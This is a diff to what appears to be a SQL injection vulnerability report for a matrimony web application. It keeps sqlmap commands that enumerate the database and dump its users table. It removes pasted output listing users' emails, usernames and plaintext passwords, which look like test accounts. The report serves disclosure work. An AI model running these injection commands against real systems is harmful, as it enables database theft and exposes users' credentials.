@@ -38,15 +38,3 @@ python sqlmap.py -r 1 -p id --batch -D matrimony -tables
 python sqlmap.py -r 1 -p id --batch -D matrimony -T users --dump
 ---
 This will lead to leakage of user information.
-Database: matrimony
-Table: users
-[12 entries]
-+----+---------------------------+---------+---------------------------+----------------------+-----------+-------------+-------------+
-| id | email                     | gender  | password                  | username             | userlevel | dateofbirth | profilestat |
-+----+---------------------------+---------+---------------------------+----------------------+-----------+-------------+-------------+
-| 1  | admin@nowhere.com         | male    | admin                     | admin                | 1         | 2016-02-17  | 0           |
-| 6  | test@test.com             | femal   | test                      | test                 | 0         | 2016-02-11  | 0           |
-| 7  | jdshfkjsh@nowhere.com     | male    | shobi                     | shobi                | 0         | 0000-00-00  | 0           |
-| 8  | E-Mail                    | <blank> | <blank>                   | Name                 | 0         | 0000-00-00  | 0           |
-| 9  | raju@nowhere.com          | male    | raju                      | Raju                 | 0         | 0000-00-00  | 0           |
-......
